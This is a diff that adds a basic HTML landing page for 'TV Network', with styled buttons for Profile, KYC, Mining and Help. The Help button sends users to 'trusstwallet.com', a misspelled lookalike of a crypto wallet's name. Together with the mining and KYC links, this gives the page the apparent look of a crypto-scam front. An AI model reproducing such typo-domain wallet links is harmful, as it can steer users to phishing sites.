@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TV Network</title>
+    <style>
+        /* CSS styles */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 600px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        h1 {
+            color: #4CAF50;
+            font-size: 2em;
+            margin: 0.67em 0;
+        }
+
+        .button-container {
+            margin-top: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .action-button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+            flex: 1 1 40%;
+            max-width: 200px;
+            box-sizing: border-box;
+            transition: background-color 0.3s ease;
+        }
+
+        .action-button:hover {
+            background-color: #45a049;
+        }
+
+        /* Media Queries for Mobile Devices */
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.5em;
+            }
+
+            .action-button {
+                flex: 1 1 80%;
+                max-width: 100%;
+                margin: 10px 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome to TV Network</h1>
+        <p>Explore our services and features.</p>
+        <div class="button-container">
+            <button class="action-button" onclick="goToProfile()">Profile</button>
+            <button class="action-button" onclick="goToKYC()">KYC</button>
+            <button class="action-button" onclick="goToMining()">Mining</button>
+            <button class="action-button" onclick="goToHelp()">Help</button>
+        </div>
+    </div>
+
+    <script>
+        function goToProfile() {
+            window.location.href = 'profile.html';
+        }
+
+        function goToKYC() {
+            window.location.href = 'kyc.html';
+        }
+
+        function goToMining() {
+            window.location.href = 'mining.html';
+        }
+
+        function goToHelp() {
+            // Redirect the user to Trusst Wallet website
+            window.location.href = 'https://trusstwallet.com'; // Replace with Trusst Wallet's actual URL
+        }
+    </script>
+</body>
+</html>
